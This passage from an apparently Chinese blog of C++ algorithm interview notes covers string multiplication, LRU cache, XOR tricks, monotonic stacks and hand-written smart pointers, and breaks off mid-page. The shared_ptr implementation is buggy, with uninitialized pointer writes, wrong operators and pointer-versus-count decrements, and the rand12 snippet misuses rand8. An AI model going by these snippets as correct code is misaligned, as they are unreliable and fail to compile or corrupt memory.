class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    string multiply(string num1, string num2) &#123;</span><br><span class="line">        int m=num1.size();</span><br><span class="line">        int n=num2.size();</span><br><span class="line">        //res最多m+n位</span><br><span class="line">        vector&lt;int&gt; res(n+m,0);</span><br><span class="line">        for(int i=m-1;i&gt;=0;i--)</span><br><span class="line">        &#123;</span><br><span class="line">            for(int j=n-1;j&gt;=0;j--)</span><br><span class="line">            &#123;</span><br><span class="line">                int sum=res[j+i+1]+(num1[i]-&#x27;0&#x27;)*(num2[j]-&#x27;0&#x27;);</span><br><span class="line">                res[j+i+1]=sum%10;</span><br><span class="line">                //记录后面的进位不可能</span><br><span class="line">                res[i+j]+=sum/10;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        //去除前导0</span><br><span class="line">        int i=0;</span><br><span class="line">        for(;i&lt;res.size();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            if(res[i]!=0)</span><br><span class="line">            &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        //i记录了第一个不为0的位置</span><br><span class="line">        string ans;</span><br><span class="line">        for(;i&lt;res.size();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            ans+=to_string(res[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        return ans.size()==0?&quot;0&quot;:ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://pic.leetcode-cn.com/1600675705-DasmDU-file_1600675705288" alt="img"></p><h2 id="字符串排列找最大"><a href="#字符串排列找最大" class="headerlink" title="字符串排列找最大"></a>字符串排列找最大</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [3,30,34,5,9]</span><br><span class="line">输出：&quot;9534330&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">string largestNumber(vector&lt;int&gt;&amp; nums) &#123;</span><br><span class="line">    //自定义排序规则   3  43     343   433比较两个排列哪个大</span><br><span class="line">    sort(nums.begin(),nums.end(),[](const int&amp; a,const int&amp; b)</span><br><span class="line">    &#123;</span><br><span class="line">        int sx=10;</span><br><span class="line">        int sy=10;</span><br><span class="line">        while(sx&lt;=a)</span><br><span class="line">        &#123;</span><br><span class="line">            sx*=10;</span><br><span class="line">        &#125;</span><br><span class="line">        while(sy&lt;=b)</span><br><span class="line">        &#123;</span><br><span class="line">            sy*=10;</span><br><span class="line">        &#125;</span><br><span class="line">        return sy*a+b&gt;sx*b+a;</span><br><span class="line">    &#125;);</span><br><span class="line">    if(nums[0]==0)</span><br><span class="line">    &#123;</span><br><span class="line">    return &quot;0&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    string ans;</span><br><span class="line">    for(auto num:nums)</span><br><span class="line">    &#123;</span><br><span class="line">        ans+=to_string(num);</span><br><span class="line">    &#125;</span><br><span class="line">    return ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="7-智能指针"><a href="#7-智能指针" class="headerlink" title="7.智能指针"></a>7.智能指针</h1><h2 id="shared-ptr实现"><a href="#shared-ptr实现" class="headerlink" title="shared_ptr实现"></a>shared_ptr实现</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">template&lt;typename T&gt;</span><br><span class="line">class Shared_ptr</span><br><span class="line">&#123;</span><br><span class="line">    private:</span><br><span class="line">        T* m_ptr;</span><br><span class="line">        int* m_count;</span><br><span class="line">    public:</span><br><span class="line">        //初始化最好只用一次裸指针</span><br><span class="line">        Shared_ptr(T* ptr=nullptr)</span><br><span class="line">        &#123;</span><br><span class="line">            if(ptr==nullptr)</span><br><span class="line">            &#123;</span><br><span class="line">                *m_count=new int(0);</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                *m_count=new int(1);</span><br><span class="line">                *m_ptr=ptr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        //拷贝构造函数</span><br><span class="line">        Shared_ptr(const Shared_ptr&amp; sptr)</span><br><span class="line">        &#123;</span><br><span class="line">            //排除自己构造自己</span><br><span class="line">            if(this!=&amp;sptr)</span><br><span class="line">            &#123;</span><br><span class="line">                this-&gt;m_ptr=sptr-&gt;m_ptr;</span><br><span class="line">                this-&gt;m_count=sptr-&gt;count;</span><br><span class="line">                (*this-&gt;m_count)++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        //赋值运算符重载</span><br><span class="line">        Shared_ptr&amp; operator=(const Shared_ptr&amp; sptr)</span><br><span class="line">        &#123;</span><br><span class="line">            if(this==&amp;sptr)</span><br><span class="line">            &#123;</span><br><span class="line">                return *this;</span><br><span class="line">            &#125;</span><br><span class="line">            //当前指向不为空，减去</span><br><span class="line">            if(this-&gt;m_ptr!=nullptr)</span><br><span class="line">            &#123;</span><br><span class="line">                *(this-&gt;m_count)--;</span><br><span class="line">                if(*this-&gt;m_count==0)</span><br><span class="line">                &#123;</span><br><span class="line">                    delete this-&gt;m_count;</span><br><span class="line">                    delete this-&gt;m_ptr;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            //此时指向可以为空或者不为空</span><br><span class="line">            this-&gt;m_count=sptr-&gt;m_count;</span><br><span class="line">            this-&gt;m_ptr=sptr-&gt;m_ptr;</span><br><span class="line">            (*this-&gt;m_count)++;</span><br><span class="line">            return *this;      </span><br><span class="line">        &#125;</span><br><span class="line">        //重载*，对于非空返回地址里面的东西</span><br><span class="line">        T&amp; operator* ()</span><br><span class="line">        &#123;</span><br><span class="line">            if(this-&gt;m_ptr!=nullptr)</span><br><span class="line">            &#123;</span><br><span class="line">                return *this-&gt;m_ptr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        //重载-&gt;，对于非空指针，返回指向的东西</span><br><span class="line">        T&amp; operator-&gt;()</span><br><span class="line">        &#123;</span><br><span class="line">            if(this-&gt;m_ptr!=nullptr)</span><br><span class="line">            &#123;</span><br><span class="line">                return this-&gt;m_ptr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ~Shared_ptr()</span><br><span class="line">        &#123;</span><br><span class="line">            if(--(*m_count)==0)</span><br><span class="line">            &#123;</span><br><span class="line">                delete m_count;</span><br><span class="line">                delete m_ptr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        int use_count()</span><br><span class="line">        &#123;</span><br><span class="line">            return *this-&gt;m_count;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="unique-ptr实现"><a href="#unique-ptr实现" class="headerlink" title="unique_ptr实现"></a>unique_ptr实现</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">template&lt;typename T&gt;</span><br><span class="line">class munique_ptr&#123;</span><br><span class="line">    T *ptr;</span><br><span class="line">    public:</span><br><span class="line">    munique_ptr(T *_ptr=NULL):ptr(_ptr)&#123;&#125;</span><br><span class="line">    ~munique_ptr()</span><br><span class="line">    &#123;</span><br><span class="line">        delete ptr;</span><br><span class="line">    &#125;</span><br><span class="line">    //删除拷贝构造函数</span><br><span class="line">    munique_ptr(const munique_ptr &amp;r)=delete;</span><br><span class="line">    //删除赋值运算符重载函数</span><br><span class="line">    munique_ptr &amp;operator=(const munique_ptr &amp;r)=delete;</span><br><span class="line"></span><br><span class="line">    T operator*()</span><br><span class="line">    &#123;</span><br><span class="line">        return *ptr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    munique_ptr&lt;double&gt; ptr(new double(3.14));</span><br><span class="line">    cout&lt;&lt;*ptr&lt;&lt;endl;</span><br><span class="line">    munique_ptr&lt;double&gt; ptr1=ptr;</span><br><span class="line">    munique_ptr&lt;double&gt; ptr2;</span><br><span class="line">    ptr2=ptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="8-大厂常考"><a href="#8-大厂常考" class="headerlink" title="8.大厂常考"></a>8.大厂常考</h1><h2 id="LRU"><a href="#LRU" class="headerlink" title="LRU"></a>LRU</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">class LRUCache &#123;</span><br><span class="line">public:</span><br><span class="line">    LRUCache(int capacity) &#123;</span><br><span class="line">        size=capacity;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    int get(int key) &#123;</span><br><span class="line">        if(!map.count(key))</span><br><span class="line">        &#123;</span><br><span class="line">            return -1;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            pair&lt;int,int&gt; tempair=map[key];</span><br><span class="line">            dlink.remove(tempair);</span><br><span class="line">            dlink.push_back(tempair);</span><br><span class="line">            return tempair.second;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    void put(int key, int value) &#123;</span><br><span class="line">        if(map.count(key))</span><br><span class="line">        &#123;</span><br><span class="line">            pair&lt;int,int&gt; tempair=map[key];</span><br><span class="line">            int temvalue=tempair.second;</span><br><span class="line">            map.erase(key);</span><br><span class="line">            map[key]=&#123;key,value&#125;;</span><br><span class="line">            dlink.remove(&#123;key,temvalue&#125;);</span><br><span class="line">            dlink.push_back(&#123;key,value&#125;);                </span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            dlink.push_back(&#123;key,value&#125;);</span><br><span class="line">            map.insert(&#123;key,&#123;key,value&#125;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        if(dlink.size()&gt;size)</span><br><span class="line">        &#123;</span><br><span class="line">            auto tem=dlink.front().first;</span><br><span class="line">            dlink.pop_front();</span><br><span class="line">            map.erase(tem);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">private:</span><br><span class="line">    list&lt;pair&lt;int,int&gt;&gt; dlink;</span><br><span class="line">    unordered_map&lt;int,pair&lt;int,int&gt;&gt; map;</span><br><span class="line">    int size;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h2><h3 id="异或运算性质"><a href="#异或运算性质" class="headerlink" title="异或运算性质"></a>异或运算性质</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x^x=0;</span><br><span class="line">x^0=x;</span><br></pre></td></tr></table></figure><h3 id="一个只出现一次，其他出现两次"><a href="#一个只出现一次，其他出现两次" class="headerlink" title="一个只出现一次，其他出现两次"></a>一个只出现一次，其他出现两次</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    int singleNumber(vector&lt;int&gt;&amp; nums) &#123;</span><br><span class="line">    int x=0;</span><br><span class="line">    for(auto num:nums)</span><br><span class="line">    &#123;</span><br><span class="line">    x^=num;</span><br><span class="line">    &#125;</span><br><span class="line">    return x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="一个只出现一次，其他出现三次"><a href="#一个只出现一次，其他出现三次" class="headerlink" title="一个只出现一次，其他出现三次"></a>一个只出现一次，其他出现三次</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    int singleNumber(vector&lt;int&gt;&amp; nums) &#123;</span><br><span class="line">        int ans=0;</span><br><span class="line">        int bits;</span><br><span class="line">        for(int i=0;i&lt;31;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            bits=0;</span><br><span class="line">            for(auto num:nums)</span><br><span class="line">            &#123;</span><br><span class="line">                bits+=(num&gt;&gt;i)&amp;1;</span><br><span class="line">            &#125;</span><br><span class="line">            ans|=bits%3&lt;&lt;i;</span><br><span class="line">        &#125;</span><br><span class="line">        return ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="两个只出现一次，其他出现两次"><a href="#两个只出现一次，其他出现两次" class="headerlink" title="两个只出现一次，其他出现两次"></a>两个只出现一次，其他出现两次</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">1.先异或求出xy异或</span><br><span class="line">2.找到xy中低位的1</span><br><span class="line">3.每个数再异或xy分组</span><br><span class="line">4.分组后组内异或</span><br><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    vector&lt;int&gt; singleNumbers(vector&lt;int&gt;&amp; nums) &#123;</span><br><span class="line">        //先异或求x,y的异或</span><br><span class="line">        int xy=0;</span><br><span class="line">        int m=1;</span><br><span class="line">        int x=0;</span><br><span class="line">        int y=0;</span><br><span class="line">        for(auto num:nums)</span><br><span class="line">        &#123;</span><br><span class="line">            xy^=num;</span><br><span class="line">        &#125;</span><br><span class="line">        //找xy第一个1,把xy分开</span><br><span class="line">        while((xy&amp;m)==0)</span><br><span class="line">        &#123;</span><br><span class="line">            m&lt;&lt;=1;</span><br><span class="line">        &#125;</span><br><span class="line">        //分组</span><br><span class="line">        for(auto num:nums)</span><br><span class="line">        &#123;</span><br><span class="line">            if(num&amp;m)</span><br><span class="line">            &#123;</span><br><span class="line">                x^=num;</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                y^=num;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;int&gt; ans=&#123;x,y&#125;;</span><br><span class="line">        return ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="三个只出现一次，其余出现两次"><a href="#三个只出现一次，其余出现两次" class="headerlink" title="三个只出现一次，其余出现两次"></a>三个只出现一次，其余出现两次</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">思路：</span><br><span class="line">1. x &amp; (-x)所得的结果即是x最后一位1所在的位置。</span><br><span class="line">2. x = a ^ b ^ c, f(x) = x &amp; (-x)</span><br><span class="line">3. f(x^a)^f(x^b)^f(x^c) 结果必有一位是1，因为f(m)^f(n)结果为0或者为2个1</span><br><span class="line">4. f(x^a)^f(x^b)^f(x^c)的第m位为1，则x^a, x^b, x^c必有1个或者3个第m位为1</span><br><span class="line">5. 用反证法可得，x^a, x^b, x^c只有一个第m位为1</span><br><span class="line"></span><br><span class="line">我们定义一个函数f(n)，它的结果是保留数字n的二进制表示中的最后一位1，而把其他所有位都变成0。比如十进制6表示成二进制是0110，因此f(6)的结果为2（二进制为0010）。f(x^a)、f(x^b)、f(x^c)的结果均不等于0。</span><br><span class="line"></span><br><span class="line">接着我们考虑f(x^a)^f(x^b)^f(x^c)的结果。由于对于非0的n，f(n)的结果的二进制表示中只有一个数位是1，因此f(x^a)^f(x^b)^f(x^c)的结果肯定不为0。这是因为对于任意三个非零的数i、j、k，f(i)^f(j)的结果要么为0，要么结果的二进制结果中有两个1。不管是那种情况，f(i)^f(j)都不可能等于f(k)，因为f(k)不等于0，并且结果的二进制中只有一位是1。</span><br><span class="line"></span><br><span class="line">于是f(x^a)^f(x^b)^f(x^c)的结果的二进制中至少有一位是1。假设最后一位是1的位是第m位。那么x^a、x^b、x^c的结果中，有一个或者三个数字的第m位是1。</span><br><span class="line"></span><br><span class="line">接下来我们证明x^a、x^b、x^c的三个结果第m位不可能都是1。还是用反证法证明。</span><br><span class="line"></span><br><span class="line">如果x^a、x^b、x^c的第m位都是1，那么a、b、c三个数字的第m位和x的第m位都相反，因此a、b、c三个数字的第m位相同。如果a、b、c三个数字的第m位都是0，x=a^b^c结果的第m位是0。由于x和a两个数字的第m位都是0，x^a结果的第m位应该是0。同理可以证明x^b、x^c第m位都是0。这与我们的假设矛盾。如果a、b、c三个数字的第m位都是1，x=a^b^c结果的第m位是1。由于x和a两个数字的第m位都是1，x^a结果的第m位应该是0。同理可以证明x^b、x^c第m位都是0。这还是与我们的假设矛盾。</span><br><span class="line"></span><br><span class="line">因此x^a、x^b、x^c三个数字中，只有一个数字的第m位是1。于是我们找到了能够区分a、b、c三个数字的标准。这三个数字中，只有一个数字满足这个标准，而另外两个数字不满足。一旦这个满足标准数字找出来之后，另外两个数字也就可以找出来了。</span><br></pre></td></tr></table></figure><h3 id="常用位运算"><a href="#常用位运算" class="headerlink" title="常用位运算"></a>常用位运算</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.x&amp;(-x)：保留二进制下最后出现的1的位置，其余位置置0（即一个数中最大的2的n次幂的因数</span><br><span class="line">2.x&amp;(x-1)：消除二进制下最后出现1的位置，其余保持不变</span><br></pre></td></tr></table></figure><h3 id="Rand8实现Rand12"><a href="#Rand8实现Rand12" class="headerlink" title="Rand8实现Rand12"></a>Rand8实现Rand12</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">使用公式(RandX-1)*Y+RandY可以实现RandXY模拟[1,X*Y]</span><br><span class="line">比如只有rand8时模拟rand12，(rand8-1)*8+rand8可以模拟出1-64</span><br><span class="line">但是我们只需要rand12，要舍去61-64，太多了</span><br><span class="line">再次使用(num-60-1)*8+rand8模拟[1-32],舍去[25,32]</span><br><span class="line">再次使用(num-24-1)*8+rand8模拟[1-64],舍去[61-64]</span><br><span class="line">循环，最终选择舍去61-64即可</span><br><span class="line">int rand12()</span><br><span class="line">&#123;</span><br><span class="line">while(true)</span><br><span class="line">&#123;</span><br><span class="line">int num=(rand8-1)*8+rand8;</span><br><span class="line">if(num&lt;=60)</span><br><span class="line">&#123;</span><br><span class="line">return num%12+1;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="单调栈模板"><a href="#单调栈模板" class="headerlink" title="单调栈模板"></a>单调栈模板</h3><p>使用场景:最近的一个比当前值大/小</p><p>1.单调栈一般从后往前遍历</p><p>2.单调栈保存的是nums[i]右边均小于(大于)元素的按照从大到小的顺序排列</p><p>![](G:\OneDrive - 东南大学\面试准备\算法\单调栈\幻灯片1.PNG)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">stack&lt;int&gt; st;</span><br><span class="line">for(int i = 0; i &lt; nums.size(); i++)</span><br><span class="line">&#123;</span><br><span class="line">while(!st.empty() &amp;&amp; st.top() &gt; nums[i])</span><br><span class="line">&#123;</span><br><span class="line">st.pop();</span><br><span class="line">&#125;</span><br><span class="line">st.push(nums[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;int&gt; nextGreaterElement(vector&lt;int&gt;&amp; nums) &#123;</span><br><span class="line">    vector&lt;int&gt; ans(nums.size()); // 存放答案的数组</span><br><span class="line">    stack&lt;int&gt; s;</span><br><span class="line">    for (int i = nums.size() - 1; i &gt;= 0; i--) &#123; // 倒着往栈里放</span><br><span class="line">        while (!s.empty() &amp;&amp; s.top() &lt;= nums[i]) &#123; // 判定个子高矮</span><br><span class="line">            s.pop(); // 矮个起开，反正也被挡着了。。。</span><br><span class="line">        &#125;</span><br><span class="line">        ans[i] = s.empty() ? -1 : s.top(); // 这个元素身后的第一个高个</span><br><span class="line">        s.push(nums[i]); // 进队，接受之后的身高判定吧！</span><br><span class="line">    &#125;</span><br><span class="line">    return ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="技巧循环数组"><a href="#技巧循环数组" class="headerlink" title="技巧循环数组"></a>技巧循环数组</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">将原数组扩展为2倍</span><br><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    vector&lt;int&gt; nextGreaterElements(vector&lt;int&gt;&amp; nums) &#123;</span><br><span class="line">        int n=nums.size();</span><br><span class="line">        vector&lt;int&gt; ans(n,0);</span><br><span class="line">        stack&lt;int&gt; sta;</span><br><span class="line">        for(int i=2*n-1;i&gt;=0;i--)</span><br><span class="line">        &#123;</span><br><span class="line">            while(!sta.empty()&amp;&amp;sta.top()&lt;=nums[i%n])</span><br><span class="line">            &#123;</span><br><span class="line">                sta.pop();</span><br><span class="line">            &#125;</span><br><span class="line">            ans[i%n]=sta.empty()?-1:sta.top();</span><br><span class="line">            sta.push(nums[i%n]);</span><br><span class="line">        &#125;</span><br><span class="line">        return ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="接雨水"><a href="#接雨水" class="headerlink" title="接雨水"></a>接雨水</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">思路1：暴力，找到i位置左右最大的元素，每一列雨水的高度，取决于，该列 左侧最高的柱子和右侧最高的柱子中最矮的那个柱子的高度-当前柱子高度</span><br></pre></td></tr></table></figure><p><img src="https://pic.leetcode-cn.com/1617328346-rDZcQx-file_1617328346572" alt="42.接雨水3"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 